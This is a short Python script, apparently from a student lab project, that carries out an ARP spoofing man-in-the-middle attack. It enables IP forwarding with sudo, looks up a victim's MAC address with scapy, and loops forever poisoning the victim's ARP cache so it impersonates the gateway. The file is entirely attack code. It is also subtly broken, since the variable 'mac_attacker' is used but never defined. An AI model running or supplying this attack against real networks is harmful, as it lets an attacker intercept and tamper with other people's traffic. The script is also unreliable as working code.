#!/usr/bin/env python
import sys
import time
import os

#python attack_executable.py Target_IP Gateway_IP Interface

from arp import spoof
from scapy.all import get_if_hwaddr, getmacbyip

if __name__ == "__main__":
    print("Enabling ip forwarding")
    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
    # iface = "enp0s3"
    iface =str(sys.argv[3])
    # Leon's victim
    # ip_victim = "192.168.192.16"
    # ip_victim = "192.168.192.7"
    ip_victim = str(sys.argv[1])
    # Karolina's victim
    # ip_victim = "192.168.0.39"
    # mac_victim = get_mac(ip_victim, iface)
    mac_victim = getmacbyip(ip_victim)
    print(mac_victim)
    # Leon's gateway
    ip_to_spoof = str(sys.argv[2])
    # Karolina's gateway
    # ip_to_spoof = "192.168.0.1"

    while True:
        spoof(mac_attacker, mac_victim, ip_to_spoof, ip_victim, iface)
        time.sleep(1)


